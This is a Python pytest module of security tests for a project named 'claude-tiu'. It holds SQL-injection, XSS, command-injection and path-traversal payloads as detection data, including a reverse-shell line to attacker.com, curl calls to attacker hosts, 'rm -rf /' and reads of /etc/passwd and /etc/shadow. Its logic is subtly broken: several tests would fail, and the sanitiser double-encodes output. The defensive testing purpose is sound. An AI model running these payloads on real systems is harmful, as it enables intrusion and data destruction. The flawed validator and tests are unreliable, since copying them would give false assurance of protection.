"""
Comprehensive security tests for claude-tiu.

This module provides security testing including:
- Input validation and sanitization
- SQL injection prevention
- XSS protection
- Command injection prevention
- Authentication and authorization
- Data encryption and protection
- API security
- File system security
"""

import hashlib
import os
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import Mock, patch

import pytest


class SecurityValidator:
    """Security validation utility class."""
    
    # Common malicious patterns
    SQL_INJECTION_PATTERNS = [
        "'; DROP TABLE",
        "' OR '1'='1",
        "'; DELETE FROM",
        "UNION SELECT",
        "' OR 1=1--",
        "; UPDATE users SET"
    ]
    
    XSS_PATTERNS = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert('xss');//",
        "<svg onload=alert('xss')>",
        "eval('alert(1)')"
    ]
    
    COMMAND_INJECTION_PATTERNS = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl malicious.com",
        "`rm -rf /`",
        "$(curl attacker.com)",
        "; nc -e /bin/sh attacker.com 1337"
    ]
    
    PATH_TRAVERSAL_PATTERNS = [
        "../../../etc/passwd",
        "..\\\\..\\\\..\\\\windows\\\\system32",
        "/etc/shadow",
        "../../../../proc/self/environ",
        "..%2F..%2F..%2Fetc%2Fpasswd"
    ]
    
    @staticmethod
    def contains_malicious_pattern(input_str: str, patterns: List[str]) -> bool:
        """Check if input contains malicious patterns."""
        input_lower = input_str.lower()
        return any(pattern.lower() in input_lower for pattern in patterns)
    
    @staticmethod
    def is_safe_filename(filename: str) -> bool:
        """Check if filename is safe."""
        # Check for path traversal
        if ".." in filename or "/" in filename or "\\" in filename:
            return False
        
        # Check for reserved names
        reserved_names = ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]
        if filename.upper() in reserved_names:
            return False
        
        # Check for safe characters only
        safe_pattern = re.compile(r'^[a-zA-Z0-9._-]+$')
        return bool(safe_pattern.match(filename))
    
    @staticmethod
    def sanitize_input(input_str: str) -> str:
        """Sanitize input string."""
        # HTML encode special characters
        replacements = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
            '/': '&#x2F;'
        }
        
        sanitized = input_str
        for char, replacement in replacements.items():
            sanitized = sanitized.replace(char, replacement)
        
        return sanitized


class TestInputValidationSecurity:
    """Test input validation and sanitization."""
    
    @pytest.fixture
    def validator(self):
        """Create security validator."""
        return SecurityValidator()
    
    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM passwords --",
        "; DELETE FROM projects WHERE 1=1; --",
        "' OR 1=1#"
    ])
    def test_sql_injection_detection(self, validator, malicious_input):
        """Test SQL injection pattern detection."""
        # Input should be detected as malicious
        is_malicious = validator.contains_malicious_pattern(
            malicious_input, validator.SQL_INJECTION_PATTERNS
        )
        assert is_malicious, f"Failed to detect SQL injection in: {malicious_input}"
        
        # Mock input validation function
        def mock_validate_sql_input(input_str):
            return not validator.contains_malicious_pattern(
                input_str, validator.SQL_INJECTION_PATTERNS
            )
        
        # Validation should reject malicious input
        assert not mock_validate_sql_input(malicious_input)
        
        # Safe input should pass
        safe_input = "normal_user_input"
        assert mock_validate_sql_input(safe_input)
    
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "';alert('xss');//"
    ])
    def test_xss_prevention(self, validator, xss_payload):
        """Test XSS prevention mechanisms."""
        # XSS payload should be detected
        is_malicious = validator.contains_malicious_pattern(
            xss_payload, validator.XSS_PATTERNS
        )
        assert is_malicious, f"Failed to detect XSS in: {xss_payload}"
        
        # Test sanitization
        sanitized = validator.sanitize_input(xss_payload)
        
        # Sanitized output should not contain dangerous characters
        dangerous_chars = ['<', '>', '"', "'"]
        for char in dangerous_chars:
            assert char not in sanitized, f"Sanitization failed to remove {char}"
        
        # Common XSS patterns should be neutralized
        assert "script" not in sanitized.lower() or "&lt;" in sanitized
        assert "javascript:" not in sanitized.lower()
    
    @pytest.mark.parametrize("command_injection", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl malicious.com",
        "`rm -rf /`",
        "$(curl attacker.com)",
        "; nc -e /bin/sh attacker.com 1337"
    ])
    def test_command_injection_prevention(self, validator, command_injection):
        """Test command injection prevention."""
        # Command injection should be detected
        is_malicious = validator.contains_malicious_pattern(
            command_injection, validator.COMMAND_INJECTION_PATTERNS
        )
        assert is_malicious, f"Failed to detect command injection in: {command_injection}"
        
        # Mock safe command execution
        def mock_safe_command_execution(command):
            # Should reject commands with dangerous patterns
            if validator.contains_malicious_pattern(command, validator.COMMAND_INJECTION_PATTERNS):
                raise ValueError("Potentially dangerous command detected")
            return "safe_execution_result"
        
        # Malicious command should be rejected
        with pytest.raises(ValueError, match="dangerous command"):
            mock_safe_command_execution(command_injection)
        
        # Safe command should execute
        safe_command = "ls -la"
        result = mock_safe_command_execution(safe_command)
        assert result == "safe_execution_result"
    
    def test_filename_validation(self, validator):
        """Test filename validation for security."""
        # Unsafe filenames
        unsafe_filenames = [
            "../config.txt",
            "file\\..\\..\\etc\\passwd",
            "con.txt",  # Reserved name on Windows
            "file<script>.txt",
            "file|rm -rf /.txt"
        ]
        
        for filename in unsafe_filenames:
            assert not validator.is_safe_filename(filename), f"Failed to reject unsafe filename: {filename}"
        
        # Safe filenames
        safe_filenames = [
            "document.txt",
            "file_123.py",
            "data-file.json",
            "image.png"
        ]
        
        for filename in safe_filenames:
            assert validator.is_safe_filename(filename), f"Incorrectly rejected safe filename: {filename}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])